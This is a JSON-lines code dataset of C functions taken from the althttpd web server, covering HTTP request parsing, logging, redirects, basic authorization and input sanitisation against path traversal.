{"docstring": "/*\n** Tell the client that authorization is required to access the\n** document.\n*/\n", "func_signal": "static void NotAuthorized(const char *zRealm)", "code": "{\n  StartResponse(\"401 Authorization Required\");\n  nOut += printf(\n    \"WWW-Authenticate: Basic realm=\\\"%s\\\"\\r\\n\"\n    \"Content-type: text/html; charset=utf-8\\r\\n\"\n    \"\\r\\n\"\n    \"<head><title>Not Authorized</title></head>\\n\"\n    \"<body><h1>401 Not Authorized</h1>\\n\"\n    \"A login and password are required for this document\\n\"\n    \"</body>\\n\", zRealm);\n  MakeLogEntry(0, 110);  /* LOG: Not authorized */\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Make an entry in the log file.  If the HTTP connection should be\n** closed, then terminate this process.  Otherwise return.\n*/\n", "func_signal": "static void MakeLogEntry(int exitCode, int lineNum)", "code": "{\n  FILE *log;\n  if( zTmpNam ){\n    unlink(zTmpNam);\n  }\n  if( zLogFile && !omitLog ){\n    struct timeval now;\n    struct tm *pTm;\n    struct rusage self, children;\n    int waitStatus;\n    char *zRM = zRemoteUser ? zRemoteUser : \"\";\n    char *zFilename;\n    size_t sz;\n    char zDate[200];\n    char zExpLogFile[500];\n\n    if( zScript==0 ) zScript = \"\";\n    if( zRealScript==0 ) zRealScript = \"\";\n    if( zRemoteAddr==0 ) zRemoteAddr = \"\";\n    if( zHttpHost==0 ) zHttpHost = \"\";\n    if( zReferer==0 ) zReferer = \"\";\n    if( zAgent==0 ) zAgent = \"\";\n    gettimeofday(&now, 0);\n    pTm = localtime(&now.tv_sec);\n    strftime(zDate, sizeof(zDate), \"%Y-%m-%d %H:%M:%S\", pTm);\n    sz = strftime(zExpLogFile, sizeof(zExpLogFile), zLogFile, pTm);\n    if( sz>0 && sz<sizeof(zExpLogFile)-2 ){\n      zFilename = zExpLogFile;\n    }else{\n      zFilename = zLogFile;\n    }\n    waitpid(-1, &waitStatus, WNOHANG);\n    getrusage(RUSAGE_SELF, &self);\n    getrusage(RUSAGE_CHILDREN, &children);\n    if( (log = fopen(zFilename,\"a\"))!=0 ){\n#ifdef COMBINED_LOG_FORMAT\n      strftime(zDate, sizeof(zDate), \"%d/%b/%Y:%H:%M:%S %Z\", pTm);\n      fprintf(log, \"%s - - [%s] \\\"%s %s %s\\\" %s %d \\\"%s\\\" \\\"%s\\\"\\n\",\n              zRemoteAddr, zDate, zMethod, zScript, zProtocol,\n              zReplyStatus, nOut, zReferer, zAgent);\n#else\n      strftime(zDate, sizeof(zDate), \"%Y-%m-%d %H:%M:%S\", pTm);\n      /* Log record files:\n      **  (1) Date and time\n      **  (2) IP address\n      **  (3) URL being accessed\n      **  (4) Referer\n      **  (5) Reply status\n      **  (6) Bytes received\n      **  (7) Bytes sent\n      **  (8) Self user time\n      **  (9) Self system time\n      ** (10) Children user time\n      ** (11) Children system time\n      ** (12) Total wall-clock time\n      ** (13) Request number for same TCP/IP connection\n      ** (14) User agent\n      ** (15) Remote user\n      ** (16) Bytes of URL that correspond to the SCRIPT_NAME\n      ** (17) Line number in source file\n      */\n      fprintf(log,\n        \"%s,%s,\\\"%s://%s%s\\\",\\\"%s\\\",\"\n           \"%s,%d,%d,%lld,%lld,%lld,%lld,%lld,%d,\\\"%s\\\",\\\"%s\\\",%d,%d\\n\",\n        zDate, zRemoteAddr, zHttp, Escape(zHttpHost), Escape(zScript),\n        Escape(zReferer), zReplyStatus, nIn, nOut,\n        tvms(&self.ru_utime) - tvms(&priorSelf.ru_utime),\n        tvms(&self.ru_stime) - tvms(&priorSelf.ru_stime),\n        tvms(&children.ru_utime) - tvms(&priorChild.ru_utime),\n        tvms(&children.ru_stime) - tvms(&priorChild.ru_stime),\n        tvms(&now) - tvms(&beginTime),\n        nRequest, Escape(zAgent), Escape(zRM),\n        (int)(strlen(zHttp)+strlen(zHttpHost)+strlen(zRealScript)+3),\n        lineNum\n      );\n      priorSelf = self;\n      priorChild = children;\n#endif\n      fclose(log);\n      nIn = nOut = 0;\n    }\n  }\n  if( closeConnection ){\n    exit(exitCode);\n  }\n  statusSent = 0;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Do a server redirect to the document specified.  The document\n** name not contain scheme or network location or the query string.\n** It will be just the path.\n*/\n", "func_signal": "static void Redirect(const char *zPath, int iStatus, int finish, int lineno)", "code": "{\n  switch( iStatus ){\n    case 301:\n      StartResponse(\"301 Permanent Redirect\");\n      break;\n    case 308:\n      StartResponse(\"308 Permanent Redirect\");\n      break;\n    default:\n      StartResponse(\"302 Temporary Redirect\");\n      break;\n  }\n  if( zServerPort==0 || zServerPort[0]==0 || strcmp(zServerPort,\"80\")==0 ){\n    nOut += printf(\"Location: %s://%s%s%s\\r\\n\",\n                   zHttp, zServerName, zPath, zQuerySuffix);\n  }else{\n    nOut += printf(\"Location: %s://%s:%s%s%s\\r\\n\",\n                   zHttp, zServerName, zServerPort, zPath, zQuerySuffix);\n  }\n  if( finish ){\n    nOut += printf(\"Content-length: 0\\r\\n\");\n    nOut += printf(\"\\r\\n\");\n    MakeLogEntry(0, lineno);\n  }\n  fflush(stdout);\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** This routine processes a single HTTP request on standard input and\n** sends the reply to standard output.  If the argument is 1 it means\n** that we are should close the socket without processing additional\n** HTTP requests after the current request finishes.  0 means we are\n** allowed to keep the connection open and to process additional requests.\n** This routine may choose to close the connection even if the argument\n** is 0.\n** \n** If the connection should be closed, this routine calls exit() and\n** thus never returns.  If this routine does return it means that another\n** HTTP request may appear on the wire.\n*/\n", "func_signal": "void ProcessOneRequest(int forceClose)", "code": "{\n  int i, j, j0;\n  char *z;                  /* Used to parse up a string */\n  struct stat statbuf;      /* Information about the file to be retrieved */\n  FILE *in;                 /* For reading from CGI scripts */\n#ifdef LOG_HEADER\n  FILE *hdrLog = 0;         /* Log file for complete header content */\n#endif\n  char zLine[1000];         /* A buffer for input lines or forming names */\n\n  /* Change directories to the root of the HTTP filesystem\n  */\n  if( chdir(zRoot[0] ? zRoot : \"/\")!=0 ){\n    char zBuf[1000];\n    Malfunction(190,   /* LOG: chdir() failed */\n         \"cannot chdir to [%s] from [%s]\",\n         zRoot, getcwd(zBuf,999));\n  }\n  nRequest++;\n\n  /*\n  ** We must receive a complete header within 15 seconds\n  */\n  signal(SIGALRM, Timeout);\n  signal(SIGSEGV, Timeout);\n  signal(SIGPIPE, Timeout);\n  signal(SIGXCPU, Timeout);\n  if( useTimeout ) alarm(15);\n\n  /* Get the first line of the request and parse out the\n  ** method, the script and the protocol.\n  */\n  if( fgets(zLine,sizeof(zLine),stdin)==0 ){\n    exit(0);\n  }\n  gettimeofday(&beginTime, 0);\n  omitLog = 0;\n  nIn += strlen(zLine);\n\n  /* Parse the first line of the HTTP request */\n  zMethod = StrDup(GetFirstElement(zLine,&z));\n  zRealScript = zScript = StrDup(GetFirstElement(z,&z));\n  zProtocol = StrDup(GetFirstElement(z,&z));\n  if( zProtocol==0 || strncmp(zProtocol,\"HTTP/\",5)!=0 || strlen(zProtocol)!=8 ){\n    StartResponse(\"400 Bad Request\");\n    nOut += printf(\n      \"Content-type: text/plain; charset=utf-8\\r\\n\"\n      \"\\r\\n\"\n      \"This server does not understand the requested protocol\\n\"\n    );\n    MakeLogEntry(0, 200); /* LOG: bad protocol in HTTP header */\n    exit(0);\n  }\n  if( zScript[0]!='/' ) NotFound(210); /* LOG: Empty request URI */\n  while( zScript[1]=='/' ){\n    zScript++;\n    zRealScript++;\n  }\n  if( forceClose ){\n    closeConnection = 1;\n  }else if( zProtocol[5]<'1' || zProtocol[7]<'1' ){\n    closeConnection = 1;\n  }\n\n  /* This very simple server only understands the GET, POST\n  ** and HEAD methods\n  */\n  if( strcmp(zMethod,\"GET\")!=0 && strcmp(zMethod,\"POST\")!=0\n       && strcmp(zMethod,\"HEAD\")!=0 ){\n    StartResponse(\"501 Not Implemented\");\n    nOut += printf(\n      \"Content-type: text/plain; charset=utf-8\\r\\n\"\n      \"\\r\\n\"\n      \"The %s method is not implemented on this server.\\n\",\n      zMethod);\n    MakeLogEntry(0, 220); /* LOG: Unknown request method */\n    exit(0);\n  }\n\n  /* If there is a log file (if zLogFile!=0) and if the pathname in\n  ** the first line of the http request contains the magic string\n  ** \"FullHeaderLog\" then write the complete header text into the\n  ** file %s(zLogFile)-hdr.  Overwrite the file.  This is for protocol\n  ** debugging only and is only enabled if althttpd is compiled with\n  ** the -DLOG_HEADER=1 option.\n  */\n#ifdef LOG_HEADER\n  if( zLogFile\n   && strstr(zScript,\"FullHeaderLog\")!=0\n   && strlen(zLogFile)<sizeof(zLine)-50\n  ){\n    sprintf(zLine, \"%s-hdr\", zLogFile);\n    hdrLog = fopen(zLine, \"wb\");\n  }\n#endif\n\n\n  /* Get all the optional fields that follow the first line.\n  */\n  zCookie = 0;\n  zAuthType = 0;\n  zRemoteUser = 0;\n  zReferer = 0;\n  zIfNoneMatch = 0;\n  zIfModifiedSince = 0;\n  rangeEnd = 0;\n  while( fgets(zLine,sizeof(zLine),stdin) ){\n    char *zFieldName;\n    char *zVal;\n\n#ifdef LOG_HEADER\n    if( hdrLog ) fprintf(hdrLog, \"%s\", zLine);\n#endif\n    nIn += strlen(zLine);\n    zFieldName = GetFirstElement(zLine,&zVal);\n    if( zFieldName==0 || *zFieldName==0 ) break;\n    RemoveNewline(zVal);\n    if( strcasecmp(zFieldName,\"User-Agent:\")==0 ){\n      zAgent = StrDup(zVal);\n    }else if( strcasecmp(zFieldName,\"Accept:\")==0 ){\n      zAccept = StrDup(zVal);\n    }else if( strcasecmp(zFieldName,\"Accept-Encoding:\")==0 ){\n      zAcceptEncoding = StrDup(zVal);\n    }else if( strcasecmp(zFieldName,\"Content-length:\")==0 ){\n      zContentLength = StrDup(zVal);\n    }else if( strcasecmp(zFieldName,\"Content-type:\")==0 ){\n      zContentType = StrDup(zVal);\n    }else if( strcasecmp(zFieldName,\"Referer:\")==0 ){\n      zReferer = StrDup(zVal);\n      if( strstr(zVal, \"devids.net/\")!=0 ){ zReferer = \"devids.net.smut\";\n        Forbidden(230); /* LOG: Referrer is devids.net */\n      }\n    }else if( strcasecmp(zFieldName,\"Cookie:\")==0 ){\n      zCookie = StrAppend(zCookie,\"; \",zVal);\n    }else if( strcasecmp(zFieldName,\"Connection:\")==0 ){\n      if( strcasecmp(zVal,\"close\")==0 ){\n        closeConnection = 1;\n      }else if( !forceClose && strcasecmp(zVal, \"keep-alive\")==0 ){\n        closeConnection = 0;\n      }\n    }else if( strcasecmp(zFieldName,\"Host:\")==0 ){\n      int inSquare = 0;\n      char c;\n      if( sanitizeString(zVal) ){\n        Forbidden(240);  /* LOG: Illegal content in HOST: parameter */\n      }\n      zHttpHost = StrDup(zVal);\n      zServerPort = zServerName = StrDup(zHttpHost);\n      while( zServerPort && (c = *zServerPort)!=0\n              && (c!=':' || inSquare) ){\n        if( c=='[' ) inSquare = 1;\n        if( c==']' ) inSquare = 0;\n        zServerPort++;\n      }\n      if( zServerPort && *zServerPort ){\n        *zServerPort = 0;\n        zServerPort++;\n      }\n      if( zRealPort ){\n        zServerPort = StrDup(zRealPort);\n      }\n    }else if( strcasecmp(zFieldName,\"Authorization:\")==0 ){\n      zAuthType = GetFirstElement(StrDup(zVal), &zAuthArg);\n    }else if( strcasecmp(zFieldName,\"If-None-Match:\")==0 ){\n      zIfNoneMatch = StrDup(zVal);\n    }else if( strcasecmp(zFieldName,\"If-Modified-Since:\")==0 ){\n      zIfModifiedSince = StrDup(zVal);\n    }else if( strcasecmp(zFieldName,\"Range:\")==0\n           && strcmp(zMethod,\"GET\")==0 ){\n      int x1 = 0, x2 = 0;\n      int n = sscanf(zVal, \"bytes=%d-%d\", &x1, &x2);\n      if( n==2 && x1>=0 && x2>=x1 ){\n        rangeStart = x1;\n        rangeEnd = x2;\n      }else if( n==1 && x1>0 ){\n        rangeStart = x1;\n        rangeEnd = 0x7fffffff;\n      }\n    }\n  }\n#ifdef LOG_HEADER\n  if( hdrLog ) fclose(hdrLog);\n#endif\n\n  /* Disallow requests from certain clients */\n  if( zAgent ){\n    const char *azDisallow[] = {\n      \"Windows 9\",\n      \"Download Master\",\n      \"Ezooms/\",\n      \"HTTrace\",\n      \"AhrefsBot\",\n      \"MicroMessenger\",\n      \"OPPO A33 Build\",\n      \"SemrushBot\",\n      \"MegaIndex.ru\",\n      \"MJ12bot\",\n      \"Chrome/0.A.B.C\",\n      \"Neevabot/\",\n      \"BLEXBot/\",\n    };\n    size_t ii;\n    for(ii=0; ii<sizeof(azDisallow)/sizeof(azDisallow[0]); ii++){\n      if( strstr(zAgent,azDisallow[ii])!=0 ){\n        Forbidden(250);  /* LOG: Disallowed user agent */\n      }\n    }\n#if 0\n    /* Spider attack from 2019-04-24 */\n    if( strcmp(zAgent,\n            \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \"\n            \"(KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\")==0 ){\n      Forbidden(251);  /* LOG: Disallowed user agent (20190424) */\n    }\n#endif\n  }\n#if 0\n  if( zReferer ){\n    static const char *azDisallow[] = {\n      \"skidrowcrack.com\",\n      \"hoshiyuugi.tistory.com\",\n      \"skidrowgames.net\",\n    };\n    int i;\n    for(i=0; i<sizeof(azDisallow)/sizeof(azDisallow[0]); i++){\n      if( strstr(zReferer, azDisallow[i])!=0 ){\n        NotFound(260);  /* LOG: Disallowed referrer */\n      }\n    }\n  }\n#endif\n\n  /* Make an extra effort to get a valid server name and port number.\n  ** Only Netscape provides this information.  If the browser is\n  ** Internet Explorer, then we have to find out the information for\n  ** ourselves.\n  */\n  if( zServerName==0 ){\n    zServerName = SafeMalloc( 100 );\n    gethostname(zServerName,100);\n  }\n  if( zServerPort==0 || *zServerPort==0 ){\n    zServerPort = DEFAULT_PORT;\n  }\n\n  /* Remove the query string from the end of the requested file.\n  */\n  for(z=zScript; *z && *z!='?'; z++){}\n  if( *z=='?' ){\n    zQuerySuffix = StrDup(z);\n    *z = 0;\n  }else{\n    zQuerySuffix = \"\";\n  }\n  zQueryString = *zQuerySuffix ? &zQuerySuffix[1] : zQuerySuffix;\n\n  /* Create a file to hold the POST query data, if any.  We have to\n  ** do it this way.  We can't just pass the file descriptor down to\n  ** the child process because the fgets() function may have already\n  ** read part of the POST data into its internal buffer.\n  */\n  if( zMethod[0]=='P' && zContentLength!=0 ){\n    size_t len = atoi(zContentLength);\n    FILE *out;\n    char *zBuf;\n    int n;\n\n    if( len>MAX_CONTENT_LENGTH ){\n      StartResponse(\"500 Request too large\");\n      nOut += printf(\n        \"Content-type: text/plain; charset=utf-8\\r\\n\"\n        \"\\r\\n\"\n        \"Too much POST data\\n\"\n      );\n      MakeLogEntry(0, 270); /* LOG: Request too large */\n      exit(0);\n    }\n    rangeEnd = 0;\n    sprintf(zTmpNamBuf, \"/tmp/-post-data-XXXXXX\");\n    zTmpNam = zTmpNamBuf;\n    if( mkstemp(zTmpNam)<0 ){\n      Malfunction(280,  /* LOG: mkstemp() failed */\n               \"Cannot create a temp file in which to store POST data\");\n    }\n    out = fopen(zTmpNam,\"wb\");\n    if( out==0 ){\n      StartResponse(\"500 Cannot create /tmp file\");\n      nOut += printf(\n        \"Content-type: text/plain; charset=utf-8\\r\\n\"\n        \"\\r\\n\"\n        \"Could not open \\\"%s\\\" for writing\\n\", zTmpNam\n      );\n      MakeLogEntry(0, 290); /* LOG: cannot create temp file for POST */\n      exit(0);\n    }\n    zBuf = SafeMalloc( len+1 );\n    if( useTimeout ) alarm(15 + len/2000);\n    n = fread(zBuf,1,len,stdin);\n    nIn += n;\n    fwrite(zBuf,1,n,out);\n    free(zBuf);\n    fclose(out);\n  }\n\n  /* Make sure the running time is not too great */\n  if( useTimeout ) alarm(10);\n\n  /* Convert all unusual characters in the script name into \"_\".\n  **\n  ** This is a defense against various attacks, XSS attacks in particular.\n  */\n  sanitizeString(zScript);\n\n  /* Do not allow \"/.\" or \"/-\" to to occur anywhere in the entity name.\n  ** This prevents attacks involving \"..\" and also allows us to create\n  ** files and directories whose names begin with \"-\" or \".\" which are\n  ** invisible to the webserver.\n  **\n  ** Exception:  Allow the \"/.well-known/\" prefix in accordance with\n  ** RFC-5785.\n  */\n  for(z=zScript; *z; z++){\n    if( *z=='/' && (z[1]=='.' || z[1]=='-') ){\n      if( strncmp(zScript,\"/.well-known/\",13)==0 && (z[1]!='.' || z[2]!='.') ){\n        /* Exception:  Allow \"/.\" and \"/-\" for URLs that being with\n        ** \"/.well-known/\".  But do not allow \"/..\". */\n        continue;\n      }\n      NotFound(300); /* LOG: Path element begins with \".\" or \"-\" */\n    }\n  }\n\n  /* Figure out what the root of the filesystem should be.  If the\n  ** HTTP_HOST parameter exists (stored in zHttpHost) then remove the\n  ** port number from the end (if any), convert all characters to lower\n  ** case, and convert non-alphanumber characters (including \".\") to \"_\".\n  ** Then try to find a directory with that name and the extension .website.\n  ** If not found, look for \"default.website\".\n  */\n  if( zScript[0]!='/' ){\n    NotFound(310); /* LOG: URI does not start with \"/\" */\n  }\n  if( strlen(zRoot)+40 >= sizeof(zLine) ){\n    NotFound(320); /* LOG: URI too long */\n  }\n  if( zHttpHost==0 || zHttpHost[0]==0 ){\n    NotFound(330);  /* LOG: Missing HOST: parameter */\n  }else if( strlen(zHttpHost)+strlen(zRoot)+10 >= sizeof(zLine) ){\n    NotFound(340);  /* LOG: HOST parameter too long */\n  }else{\n    sprintf(zLine, \"%s/%s\", zRoot, zHttpHost);\n    for(i=strlen(zRoot)+1; zLine[i] && zLine[i]!=':'; i++){\n      unsigned char c = (unsigned char)zLine[i];\n      if( !isalnum(c) ){\n        if( c=='.' && (zLine[i+1]==0 || zLine[i+1]==':') ){\n          /* If the client sent a FQDN with a \".\" at the end\n          ** (example: \"sqlite.org.\" instead of just \"sqlite.org\") then\n          ** omit the final \".\" from the document root directory name */\n          break;\n        }\n        zLine[i] = '_';\n      }else if( isupper(c) ){\n        zLine[i] = tolower(c);\n      }\n    }\n    strcpy(&zLine[i], \".website\");\n  }\n  if( stat(zLine,&statbuf) || !S_ISDIR(statbuf.st_mode) ){\n    sprintf(zLine, \"%s/default.website\", zRoot);\n    if( stat(zLine,&statbuf) || !S_ISDIR(statbuf.st_mode) ){\n      if( standalone ){\n        sprintf(zLine, \"%s\", zRoot);\n      }else{\n        NotFound(350);  /* LOG: *.website permissions */\n      }\n    }\n  }\n  zHome = StrDup(zLine);\n\n  /* Change directories to the root of the HTTP filesystem\n  */\n  if( chdir(zHome)!=0 ){\n    char zBuf[1000];\n    Malfunction(360,  /* LOG: chdir() failed */\n         \"cannot chdir to [%s] from [%s]\",\n         zHome, getcwd(zBuf,999));\n  }\n\n  /* Locate the file in the filesystem.  We might have to append\n  ** a name like \"/home\" or \"/index.html\" or \"/index.cgi\" in order\n  ** to find it.  Any excess path information is put into the\n  ** zPathInfo variable.\n  */\n  j = j0 = (int)strlen(zLine);\n  i = 0;\n  while( zScript[i] ){\n    while( zScript[i] && (i==0 || zScript[i]!='/') ){\n      zLine[j] = zScript[i];\n      i++; j++;\n    }\n    zLine[j] = 0;\n    if( stat(zLine,&statbuf)!=0 ){\n      int stillSearching = 1;\n      while( stillSearching && i>0 && j>j0 ){\n        while( j>j0 && zLine[j-1]!='/' ){ j--; }\n        strcpy(&zLine[j-1], \"/not-found.html\");\n        if( stat(zLine,&statbuf)==0 && S_ISREG(statbuf.st_mode)\n            && access(zLine,R_OK)==0 ){\n          zRealScript = StrDup(&zLine[j0]);\n          Redirect(zRealScript, 302, 1, 370); /* LOG: redirect to not-found */\n          return;\n        }else{\n          j--;\n        }\n      }\n      if( stillSearching ) NotFound(380); /* LOG: URI not found */\n      break;\n    }\n    if( S_ISREG(statbuf.st_mode) ){\n      if( access(zLine,R_OK) ){\n        NotFound(390);  /* LOG: File not readable */\n      }\n      zRealScript = StrDup(&zLine[j0]);\n      break;\n    }\n    if( zScript[i]==0 || zScript[i+1]==0 ){\n      static const char *azIndex[] = { \"/home\", \"/index.html\", \"/index.cgi\" };\n      int k = j>0 && zLine[j-1]=='/' ? j-1 : j;\n      unsigned int jj;\n      for(jj=0; jj<sizeof(azIndex)/sizeof(azIndex[0]); jj++){\n        strcpy(&zLine[k],azIndex[jj]);\n        if( stat(zLine,&statbuf)!=0 ) continue;\n        if( !S_ISREG(statbuf.st_mode) ) continue;\n        if( access(zLine,R_OK) ) continue;\n        break;\n      }\n      if( jj>=sizeof(azIndex)/sizeof(azIndex[0]) ){\n        NotFound(400); /* LOG: URI is a directory w/o index.html */\n      }\n      zRealScript = StrDup(&zLine[j0]);\n      if( zScript[i]==0 ){\n        /* If the requested URL does not end with \"/\" but we had to\n        ** append \"index.html\", then a redirect is necessary.  Otherwise\n        ** none of the relative URLs in the delivered document will be\n        ** correct. */\n        Redirect(zRealScript,301,1,410); /* LOG: redirect to add trailing / */\n        return;\n      }\n      break;\n    }\n    zLine[j] = zScript[i];\n    i++; j++;\n  }\n  zFile = StrDup(zLine);\n  zPathInfo = StrDup(&zScript[i]);\n  lenFile = strlen(zFile);\n  zDir = StrDup(zFile);\n  for(i=strlen(zDir)-1; i>0 && zDir[i]!='/'; i--){};\n  if( i==0 ){\n     strcpy(zDir,\"/\");\n  }else{\n     zDir[i] = 0;\n  }\n\n  /* Check to see if there is an authorization file.  If there is,\n  ** process it.\n  */\n  sprintf(zLine, \"%s/-auth\", zDir);\n  if( access(zLine,R_OK)==0 && !CheckBasicAuthorization(zLine) ) return;\n\n  /* Take appropriate action\n  */\n  if( (statbuf.st_mode & 0100)==0100 && access(zFile,X_OK)==0 ){\n    char *zBaseFilename;         /* Filename without directory prefix */\n\n    /*\n    ** Abort with an error if the CGI script is writable by anyone other\n    ** than its owner.\n    */\n    if( statbuf.st_mode & 0022 ){\n      CgiScriptWritable();\n    }\n\n    /* If its executable, it must be a CGI program.  Start by\n    ** changing directories to the directory holding the program.\n    */\n    if( chdir(zDir) ){\n      char zBuf[1000];\n      Malfunction(420, /* LOG: chdir() failed */\n           \"cannot chdir to [%s] from [%s]\", \n           zDir, getcwd(zBuf,999));\n    }\n\n    /* Compute the base filename of the CGI script */\n    for(i=strlen(zFile)-1; i>=0 && zFile[i]!='/'; i--){}\n    zBaseFilename = &zFile[i+1];\n\n    /* Setup the environment appropriately.\n    */\n    putenv(\"GATEWAY_INTERFACE=CGI/1.0\");\n    for(i=0; i<(int)(sizeof(cgienv)/sizeof(cgienv[0])); i++){\n      if( *cgienv[i].pzEnvValue ){\n        SetEnv(cgienv[i].zEnvName,*cgienv[i].pzEnvValue);\n      }\n    }\n    if( useHttps ){\n      putenv(\"HTTPS=on\");\n      putenv(\"REQUEST_SCHEME=https\");\n    }else{\n      putenv(\"REQUEST_SCHEME=http\");\n    }\n\n    /* For the POST method all input has been written to a temporary file,\n    ** so we have to redirect input to the CGI script from that file.\n    */\n    if( zMethod[0]=='P' ){\n      if( dup(0)<0 ){\n        Malfunction(430,  /* LOG: dup(0) failed */\n                    \"Unable to duplication file descriptor 0\");\n      }\n      close(0);\n      open(zTmpNam, O_RDONLY);\n    }\n\n    if( strncmp(zBaseFilename,\"nph-\",4)==0 ){\n      /* If the name of the CGI script begins with \"nph-\" then we are\n      ** dealing with a \"non-parsed headers\" CGI script.  Just exec()\n      ** it directly and let it handle all its own header generation.\n      */\n      execl(zBaseFilename,zBaseFilename,(char*)0);\n      /* NOTE: No log entry written for nph- scripts */\n      exit(0);\n    }\n\n    /* Fall thru to here only if this process (the server) is going\n    ** to read and augment the header sent back by the CGI process.\n    ** Open a pipe to receive the output from the CGI process.  Then\n    ** fork the CGI process.  Once everything is done, we should be\n    ** able to read the output of CGI on the \"in\" stream.\n    */\n    {\n      int px[2];\n      if( pipe(px) ){\n        Malfunction(440, /* LOG: pipe() failed */\n                    \"Unable to create a pipe for the CGI program\");\n      }\n      if( fork()==0 ){\n        close(px[0]);\n        close(1);\n        if( dup(px[1])!=1 ){\n          Malfunction(450, /* LOG: dup(1) failed */\n                 \"Unable to duplicate file descriptor %d to 1\",\n                 px[1]);\n        }\n        close(px[1]);\n        for(i=3; close(i)==0; i++){}\n        execl(zBaseFilename, zBaseFilename, (char*)0);\n        exit(0);\n      }\n      close(px[1]);\n      in = fdopen(px[0], \"rb\");\n    }\n    if( in==0 ){\n      CgiError();\n    }else{\n      CgiHandleReply(in);\n    }\n  }else if( lenFile>5 && strcmp(&zFile[lenFile-5],\".scgi\")==0 ){\n    /* Any file that ends with \".scgi\" is assumed to be text of the\n    ** form:\n    **     SCGI hostname port\n    ** Open a TCP/IP connection to that host and send it an SCGI request\n    */\n    SendScgiRequest(zFile, zScript);\n  }else if( countSlashes(zRealScript)!=countSlashes(zScript) ){\n    /* If the request URI for static content contains material past the\n    ** actual content file name, report that as a 404 error. */\n    NotFound(460); /* LOG: Excess URI content past static file name */\n  }else{\n    /* If it isn't executable then it\n    ** must a simple file that needs to be copied to output.\n    */\n    if( SendFile(zFile, lenFile, &statbuf) ) return;\n  }\n  fflush(stdout);\n  MakeLogEntry(0, 0);  /* LOG: Normal reply */\n\n  /* The next request must arrive within 30 seconds or we close the connection\n  */\n  omitLog = 1;\n  if( useTimeout ) alarm(30);\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Remove all disallowed characters in the input string z[].  Convert any\n** disallowed characters into \"_\".\n**\n** Not that the three character sequence \"%XX\" where X is any byte is\n** converted into a single \"_\" character.\n**\n** Return the number of characters converted.  An \"%XX\" -> \"_\" conversion\n** counts as a single character.\n*/\n", "func_signal": "static int sanitizeString(char *z)", "code": "{\n  int nChange = 0;\n  while( *z ){\n    if( !allowedInName[*(unsigned char*)z] ){\n      if( *z=='%' && z[1]!=0 && z[2]!=0 ){\n        int i;\n        for(i=3; (z[i-2] = z[i])!=0; i++){}\n      }\n      *z = '_';\n      nChange++;\n    }\n    z++;\n  }\n  return nChange;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Check to see if basic authorization credentials are provided for\n** the user according to the information in zAuthFile.  Return true\n** if authorized.  Return false if not authorized.\n**\n** File format:\n**\n**    *  Blank lines and lines that begin with '#' are ignored\n**    *  \"http-redirect\" forces a redirect to HTTPS if not there already\n**    *  \"https-only\" disallows operation in HTTP\n**    *  \"user NAME LOGIN:PASSWORD\" checks to see if LOGIN:PASSWORD \n**       authorization credentials are provided, and if so sets the\n**       REMOTE_USER to NAME.\n**    *  \"realm TEXT\" sets the realm to TEXT.\n**    *  \"anyone\" bypasses authentication and allows anyone to see the\n**       files.  Useful in combination with \"http-redirect\"\n*/\n", "func_signal": "static int CheckBasicAuthorization(const char *zAuthFile)", "code": "{\n  FILE *in;\n  char *zRealm = \"unknown realm\";\n  char *zLoginPswd;\n  char *zName;\n  char zLine[2000];\n\n  in = fopen(zAuthFile, \"rb\");\n  if( in==0 ){\n    NotFound(150);  /* LOG: Cannot open -auth file */\n    return 0;\n  }\n  if( zAuthArg ) Decode64(zAuthArg);\n  while( fgets(zLine, sizeof(zLine), in) ){\n    char *zFieldName;\n    char *zVal;\n\n    zFieldName = GetFirstElement(zLine,&zVal);\n    if( zFieldName==0 || *zFieldName==0 ) continue;\n    if( zFieldName[0]=='#' ) continue;\n    RemoveNewline(zVal);\n    if( strcmp(zFieldName, \"realm\")==0 ){\n      zRealm = StrDup(zVal);\n    }else if( strcmp(zFieldName,\"user\")==0 ){\n      if( zAuthArg==0 ) continue;\n      zName = GetFirstElement(zVal, &zVal);\n      zLoginPswd = GetFirstElement(zVal, &zVal);\n      if( zLoginPswd==0 ) continue;\n      if( zAuthArg && strcmp(zAuthArg,zLoginPswd)==0 ){\n        zRemoteUser = StrDup(zName);\n        fclose(in);\n        return 1;\n      }\n    }else if( strcmp(zFieldName,\"https-only\")==0 ){\n      if( !useHttps ){\n        NotFound(160);  /* LOG:  http request on https-only page */\n        fclose(in);\n        return 0;\n      }\n    }else if( strcmp(zFieldName,\"http-redirect\")==0 ){\n      if( !useHttps ){\n        zHttp = \"https\";\n        Redirect(zScript, 301, 1, 170); /* LOG: -auth redirect */\n        fclose(in);\n        return 0;\n      }\n    }else if( strcmp(zFieldName,\"anyone\")==0 ){\n      fclose(in);\n      return 1;\n    }else{\n      NotFound(180);  /* LOG:  malformed entry in -auth file */\n      fclose(in);\n      return 0;\n    }\n  }\n  fclose(in);\n  NotAuthorized(zRealm);\n  return 0;\n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
{"docstring": "/*\n** Tell the client that the server malfunctioned.\n*/\n", "func_signal": "static void Malfunction(int linenum, const char *zFormat, ...)", "code": "{\n  va_list ap;\n  va_start(ap, zFormat);\n  StartResponse(\"500 Server Malfunction\");\n  nOut += printf(\n    \"Content-type: text/plain; charset=utf-8\\r\\n\"\n    \"\\r\\n\"\n    \"Web server malfunctioned; error number %d\\n\\n\", linenum);\n  if( zFormat ){\n    nOut += vprintf(zFormat, ap);\n    printf(\"\\n\");\n    nOut++;\n  }\n  MakeLogEntry(0, linenum);\n  exit(0);       \n}", "path": "althttpd.c", "repo_name": "jesrui/althttpd", "stars": 293, "license": "None", "language": "c", "size": 41}
